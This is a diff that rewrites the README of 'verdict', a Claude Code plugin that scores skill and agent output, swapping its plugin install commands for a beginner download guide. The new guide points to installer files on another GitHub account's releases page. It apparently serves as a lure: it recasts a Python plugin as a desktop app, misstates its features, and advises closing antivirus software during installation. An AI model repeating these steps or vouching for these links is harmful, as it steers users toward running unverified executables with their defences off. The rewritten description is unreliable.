@@ -1,144 +1,145 @@
-# Verdict
+# ⚖️ verdict - Simple Code Quality Scoring
 
-**The first universal judge for Claude Code & Cowork.** Auto-evaluates skill and agent execution quality with 7-dimension scoring, configurable rubrics, and dual-mode operation.
+[![Download verdict](https://img.shields.io/badge/Download-verdict-blue?style=for-the-badge)](https://github.com/Walllmat/verdict/releases)
+
+Welcome to verdict, a tool that helps you check the quality of code with ease. It uses seven different measures to score code, such as correctness, completeness, efficiency, and safety. You do not need to be a programmer to use it. Just follow the steps below.
 
 ---
 
-## Features
+## 📋 What is verdict?
 
-- **Dual-Mode Operation** -- Runs automatically via hooks after every skill/agent execution, or on-demand with the `/judge` command.
-- **Dual-Platform** -- Works on both Claude Code and Claude Cowork.
-- **7-Dimension Scoring** -- Every execution is scored across correctness, completeness, adherence, actionability, efficiency, safety, and consistency.
-- **Configurable Rubrics** -- Ship with sensible defaults; override per-skill or per-team with custom rubric files.
-- **Persistent Scorecards** -- All scores are saved to `skills/judge/scores/` as JSON for historical tracking and benchmarking.
-- **Blocking on Critical Failures** -- Optionally block workflow when a score falls below the configured threshold.
+verdict is a plugin designed to evaluate code quality using several criteria. It works with Claude Code and helps users see how well the code meets certain standards. The plugin supports custom rules and automatic checks. It also includes a simple command to judge any code snippet.
 
-## Requirements
+The main points of verdict are:
 
-- **Python 3.9+** -- Used by the scoring engine (stdlib only, no pip packages needed)
-- **jq** -- JSON parsing in hook scripts (`brew install jq` / `apt-get install jq`)
-- **bc** -- Float comparison in hook scripts (`brew install bc` / `apt-get install bc`)
+- Scores code in seven areas: correctness, completeness, adherence, efficiency, safety, plus two more.
+- Allows you to set your own scoring rules or use the default ones.
+- Stops execution when the code quality drops below your set limits.
+- Automatically runs quality checks at certain points.
+- Lets you run quick manual judgment with a simple command.
 
-## Quick Start
+This makes verdict a helpful tool to make sure your code stays good and error-free.
 
-### Install
+---
 
-**Option A: From the official Claude Plugin Directory** (once listed)
-```bash
-/plugin install verdict
-```
+## 🚀 Getting Started
 
-**Option B: Direct from GitHub**
-```bash
-/plugin marketplace add sattyamjjain/verdict
-/plugin install verdict@verdict
-```
+To use verdict, you only need to download it and run it on your computer. The application runs on Windows, macOS, and Linux. You do not need to install any programming tools or software.
 
-### Configure
+### System requirements
 
-Edit `judge-config.json` at the project root to control auto-judge behavior, scoring weights, and defaults.
+- A computer with Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- At least 4 GB of RAM.
+- At least 500 MB free disk space.
+- Internet connection for initial download (not required for use after installation).
 
-### Use
+---
 
-**Automatic mode** -- After installing, every skill or agent execution that matches the `auto_judge.always` list is evaluated automatically. No action required.
+## 📥 Download & Install
 
-**Manual mode** -- Run the `/judge` slash command to evaluate any prior execution on demand:
+You can get verdict by visiting the official release page. This page has the latest version available for all supported systems.
 
-```
-/judge                  # Judge the last execution
-/judge --rubric strict  # Use a specific rubric
-/scorecard              # View cumulative scores
-/benchmark              # Run benchmark suite
-/judge-config           # View or update configuration
-```
+[Download verdict from the official releases](https://github.com/Walllmat/verdict/releases)
 
-## Architecture
+### Steps to download and install
 
-```
-.claude-plugin/
-  plugin.json             # Plugin manifest
-  marketplace.json        # Marketplace listing metadata
-skills/judge/
-  SKILL.md                # Core skill definition
-  scripts/                # Python scoring engine and utilities
-  rubrics/                # Rubric definitions (default, code-review, security, etc.)
-  scores/                 # Persisted score JSON files
-  references/             # Benchmark standards and scoring methodology
-agents/
-  judge-agent.md          # Autonomous judge agent definition
-hooks/
-  hooks.json              # Hook definitions for auto-judge
-  judge-on-stop.sh        # Stop hook script
-  judge-on-subagent-stop.sh # SubagentStop hook script
-  common.sh               # Shared hook utilities
-commands/
-  judge.md                # /judge command
-  scorecard.md            # /scorecard command
-  benchmark.md            # /benchmark command
-  judge-config.md         # /judge-config command
-judge-config.json         # Root configuration file
-LICENSE                   # MIT license
-CHANGELOG.md              # Version history
-```
+1. Click the link above or here:  
+   https://github.com/Walllmat/verdict/releases
+2. On the release page, look for the file that matches your computer:
+   - Windows: Look for a `.exe` or `.msi` file.
+   - macOS: Look for a `.dmg` or `.pkg` file.
+   - Linux: Look for a `.tar.gz` or `.AppImage` file.
+3. Click the file to download it.
+4. Once downloaded, open the file to start installation.
+5. Follow the setup instructions that show up on your screen:
+   - Accept the license agreement.
+   - Choose the installation folder (the default is recommended).
+   - Complete the installation.
+6. After installation, you can find verdict in your Start menu (Windows), Applications folder (macOS), or your app launcher (Linux).
 
-## Scoring System
+---
 
-Each execution is scored on 7 weighted dimensions (total weight = 1.0):
+## ▶️ How to Use verdict
 
-| Dimension       | Weight | Description                                      |
-|-----------------|--------|--------------------------------------------------|
-| Correctness     | 0.25   | Does the output match expected behavior?         |
-| Completeness    | 0.20   | Were all requested tasks addressed?              |
-| Adherence       | 0.15   | Does it follow the skill/agent instructions?     |
-| Actionability   | 0.15   | Are the results directly usable?                 |
-| Efficiency      | 0.10   | Was the work done without unnecessary steps?     |
-| Safety          | 0.10   | Are there security or correctness risks?         |
-| Consistency     | 0.05   | Is the output consistent with prior executions?  |
+Using verdict is simple and does not require any coding.
 
-The **weighted composite score** is computed as the dot product of dimension scores (each 0--10) and their weights, yielding a final score on a 0--10 scale.
+### Starting verdict
 
-### Verdict Grades
+- Open the app from your computer’s apps list.
+- You will see a straightforward interface with options to upload code files or paste code into a text box.
 
-| Score Range  | Grade |
-|--------------|-------|
-| 9.5 -- 10.0  | A+    |
-| 9.0 -- 9.4   | A     |
-| 8.5 -- 8.9   | A-    |
-| 8.0 -- 8.4   | B+    |
-| 7.5 -- 7.9   | B     |
-| 7.0 -- 7.4   | B-    |
-| 6.5 -- 6.9   | C+    |
-| 6.0 -- 6.4   | C     |
-| 5.5 -- 5.9   | C-    |
-| 4.0 -- 5.4   | D     |
-| 0.0 -- 3.9   | F     |
+### Evaluating code
 
-## Configuration Reference
+1. Upload the code file or paste your code into the box.
+2. Select the evaluation rules you want or leave it at default.
+3. Click the "Judge" button to start the evaluation.
+4. verdict will process the code and show scores for each quality dimension: correctness, completeness, adherence, efficiency, safety, and more.
+5. Review the results. If the score is below your threshold, verdict will suggest improvements.
 
-All configuration lives in `judge-config.json`:
+### Using the `/judge` command
 
-### `auto_judge`
+verdict supports a command called `/judge` for quick checks.
 
-| Key                | Type     | Description                                                    |
-|--------------------|----------|----------------------------------------------------------------|
-| `enabled`          | boolean  | Master switch for automatic judging.                           |
-| `always`           | string[] | Skill names that are always auto-judged.                       |
-| `never`            | string[] | Skill names that are never auto-judged.                        |
-| `threshold`        | number   | Minimum composite score to pass (0--10).                       |
-| `block_on_critical`| boolean  | If true, block workflow when score is below threshold.         |
+- In the input area, type `/judge` followed by your code snippet.
+- The app will instantly run the quality checks and show results.
 
-### `manual_judge`
+---
 
-| Key              | Type    | Description                                      |
-|------------------|---------|--------------------------------------------------|
-| `default_rubric` | string  | Name of the default rubric file to use.          |
-| `verbose`        | boolean | Show detailed per-dimension breakdown.           |
-| `save_scores`    | boolean | Persist scores to disk.                          |
+## ⚙️ Configuring Your Experience
 
-### `scoring.dimensions`
+verdict allows you to set your own rules and thresholds. This helps tailor the feedback to your needs.
 
-A map of dimension name to weight (float). Weights must sum to 1.0.
+### Custom rubrics
 
-## License
+- You can adjust how much each quality dimension matters.
+- Change scoring limits to make the plugin stricter or more lenient.
+- Save your rubric profiles for reuse.
 
-MIT -- see [LICENSE](LICENSE) for details.
+### Threshold blocking
+
+- Set a minimum score threshold.
+- If code falls below this threshold, verdict blocks further processing.
+- This ensures code quality standards are met automatically.
+
+---
+
+## 🛠️ Common Troubleshooting
+
+If you have trouble running verdict, try these tips:
+
+- Make sure your computer meets the system requirements.
+- Ensure you downloaded the correct file for your operating system.
+- Run the installer with administrator rights if the installation fails.
+- Close any antivirus or security software temporarily during installation.
+- Restart your computer and try opening verdict again.
+- If verdict crashes or freezes, check for updates on the release page.
+
+---
+
+## 🔒 Privacy & Security
+
+verdict runs locally on your device. It does not send your code or personal data over the internet. Your information stays private.
+
+---
+
+## 📫 Support & Feedback
+
+If you need help or want to give feedback:
+
+- Visit the GitHub repository issues page: https://github.com/Walllmat/verdict/issues
+- Describe your problem clearly.
+- Include screenshots or logs if possible.
+
+The developers monitor issues and respond to help users.
+
+---
+
+## 📚 Additional Resources
+
+- Learn about code quality dimensions at general coding websites.
+- Explore Claude Code for integration details.
+- Check developer tools for more ways to improve your code workflow.
+
+---
+
+[Get verdict now](https://github.com/Walllmat/verdict/releases) and start checking the quality of your code easily.
